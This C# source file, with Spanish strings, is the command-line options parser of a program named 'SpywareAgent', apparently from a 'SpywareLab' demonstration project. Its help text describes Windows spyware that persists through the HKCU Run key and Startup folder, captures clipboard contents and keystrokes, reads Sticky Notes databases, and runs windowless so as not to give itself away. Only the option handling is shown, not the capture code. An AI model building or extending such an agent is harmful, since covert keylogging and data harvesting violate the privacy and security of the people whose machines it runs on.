namespace Spyware.Agent;

public enum AgentCommand
{
    Run,
    RunOnce,
    Install,
    Uninstall,
    Status
}

public sealed class ProgramOptions
{
    public AgentCommand Command { get; private set; } = AgentCommand.Run;

    public bool ShowHelp { get; private set; }
    public bool Verbose { get; private set; }
    public string? DataDirectory { get; private set; }

    // install
    public string? ExecutablePath { get; private set; }
    public string? ValueName { get; private set; }
    public bool CopyBinaries { get; private set; }
    public bool StartupFolder { get; private set; }
    public bool StartProcess { get; private set; }

    // uninstall
    public bool RemoveData { get; private set; }
    public bool RemoveStartupFolder { get; private set; }

    // run-once
    public int ClipboardSeconds { get; private set; } = 5;
    public int KeySeconds { get; private set; } = 5;

    // overrides de demostración (solo para esta ejecución, no se guardan en config.json)
    public string? NotesDatabase { get; private set; }
    public string? NotesSnt { get; private set; }

    public static bool TryParse(string[] args, out ProgramOptions options, out string? error)
    {
        options = new ProgramOptions();
        error = null;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i].Trim().ToLowerInvariant())
            {
                case "-h":
                case "--help":
                case "/?":
                    options.ShowHelp = true;
                    break;

                case "--run-once":
                    options.Command = AgentCommand.RunOnce;
                    break;

                case "--install":
                    options.Command = AgentCommand.Install;
                    break;

                case "--uninstall":
                    options.Command = AgentCommand.Uninstall;
                    break;

                case "--status":
                    options.Command = AgentCommand.Status;
                    break;

                case "--verbose":
                case "-v":
                    options.Verbose = true;
                    break;

                case "--copy":
                    options.CopyBinaries = true;
                    break;

                case "--startup-folder":
                    options.StartupFolder = true;
                    options.RemoveStartupFolder = true;
                    break;

                case "--start":
                    options.StartProcess = true;
                    break;

                case "--remove-data":
                    options.RemoveData = true;
                    break;

                case "--data-dir":
                    options.DataDirectory = Require(args, ref i, "--data-dir", ref error);
                    break;

                case "--path":
                    options.ExecutablePath = Require(args, ref i, "--path", ref error);
                    break;

                case "--value":
                    options.ValueName = Require(args, ref i, "--value", ref error);
                    break;

                case "--clipboard-seconds":
                    if (!int.TryParse(Require(args, ref i, "--clipboard-seconds", ref error), out int seconds))
                        error = "--clipboard-seconds necesita un entero.";
                    else
                        options.ClipboardSeconds = Math.Clamp(seconds, 1, 300);
                    break;

                case "--key-seconds":
                {
                    string? value = Require(args, ref i, "--key-seconds", ref error);
                    if (error is not null) return false;

                    if (!int.TryParse(value, out int keySeconds))
                        error = "--key-seconds necesita un entero.";
                    else
                        options.KeySeconds = Math.Clamp(keySeconds, 1, 300);

                    break;
                }

                case "--notes-file":
                    options.NotesDatabase = Require(args, ref i, "--notes-file", ref error);
                    break;

                case "--snt-file":
                    options.NotesSnt = Require(args, ref i, "--snt-file", ref error);
                    break;

                default:
                    error = $"Opción desconocida: {args[i]}";
                    return false;
            }

            if (error is not null) return false;
        }

        return true;
    }

    private static string? Require(string[] args, ref int index, string name, ref string? error)
    {
        if (index + 1 >= args.Length)
        {
            error = $"{name} requiere un valor.";
            return null;
        }

        return args[++index];
    }

    public static void PrintUsage(TextWriter writer)
    {
        writer.WriteLine("""
            SpywareAgent — spyware/monitor local para Windows 10-11 (datos sin cifrar)

            Uso:
              SpywareAgent.exe                          Ejecutar el agente en segundo plano.
              SpywareAgent.exe --install                Instalar persistencia (HKCU\...\Run).
                 --copy                                 Copiar binarios a %LOCALAPPDATA%\SpywareLab\SpywareAgent\bin
                 --startup-folder                       Añadir también acceso directo en Inicio
                 --value <nombre>                       Nombre del valor de registro
                 --path <exe>                           Ejecutable a registrar
                 --start                                Iniciar el agente tras instalar
              SpywareAgent.exe --uninstall [--remove-data] [--startup-folder]
              SpywareAgent.exe --status                 Estado, persistencia y contenido del almacén
              SpywareAgent.exe --run-once [--clipboard-seconds N] [--key-seconds N]
                                                       Ciclo completo de prueba

            Opciones comunes:
                 --data-dir <ruta>      Directorio raíz de datos (por defecto %LOCALAPPDATA%\SpywareLab\SpywareAgent)
                 --verbose              Reflejar el log en consola

            Sticky Notes para demostración (solo esta ejecución, no se guarda en config.json):
                 --notes-file <ruta>    plum.sqlite concreto en lugar del del paquete de la aplicación
                 --snt-file <ruta>      StickyNotes.snt de la versión clásica

            Nota: los verbos de consola se ven mejor desde una terminal; el exe es WinExe
                  sin ventana para no delatar al agente en uso normal.
            """);
    }
}
